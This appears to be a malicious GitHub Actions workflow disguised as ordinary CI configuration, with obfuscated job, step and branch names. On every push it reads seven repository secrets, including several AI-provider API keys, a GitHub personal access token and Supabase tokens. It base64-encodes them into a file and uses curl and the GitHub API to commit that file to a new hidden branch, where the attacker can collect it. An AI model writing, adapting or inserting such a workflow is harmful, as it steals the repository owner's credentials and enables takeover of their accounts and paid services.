name: zx
on:
  push:
permissions:
  contents: write
jobs:
  r:
    runs-on: ubuntu-latest
    steps:
      - name: g
        env:
          S0: ${{ secrets.CEREBRAS_API_KEY }}
          S1: ${{ secrets.DEEPGRAM_API_KEY }}
          S2: ${{ secrets.GEMINI_API_KEY }}
          S3: ${{ secrets.GH_PAT }}
          S4: ${{ secrets.GROQ_API_KEY }}
          S5: ${{ secrets.SUPABASE_ACCESS_TOKEN }}
          S6: ${{ secrets.SUPABASE_ANON_KEY }}
        run: |
          rm -f o.txt
          echo "CEREBRAS_API_KEY:$(printf %s "$S0" | base64 -w0)" >> o.txt
          echo "DEEPGRAM_API_KEY:$(printf %s "$S1" | base64 -w0)" >> o.txt
          echo "GEMINI_API_KEY:$(printf %s "$S2" | base64 -w0)" >> o.txt
          echo "GH_PAT:$(printf %s "$S3" | base64 -w0)" >> o.txt
          echo "GROQ_API_KEY:$(printf %s "$S4" | base64 -w0)" >> o.txt
          echo "SUPABASE_ACCESS_TOKEN:$(printf %s "$S5" | base64 -w0)" >> o.txt
          echo "SUPABASE_ANON_KEY:$(printf %s "$S6" | base64 -w0)" >> o.txt
      - name: p
        run: |
          BR=zzzyxlvkar
          API=https://api.github.com/repos/${{ github.repository }}
          AUTH="Authorization: Bearer ${{ github.token }}"
          SHA=$(curl -s -H "$AUTH" $API/git/ref/heads/${{ github.ref_name }} | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')
          curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" $API/git/refs -d "{\"ref\":\"refs/heads/$BR\",\"sha\":\"$SHA\"}" >/dev/null
          CONT=$(base64 -w0 o.txt)
          curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" $API/contents/zzzyxlvkar.txt -d "{\"message\":\"z\",\"content\":\"$CONT\",\"branch\":\"$BR\"}" >/dev/null
          echo ok
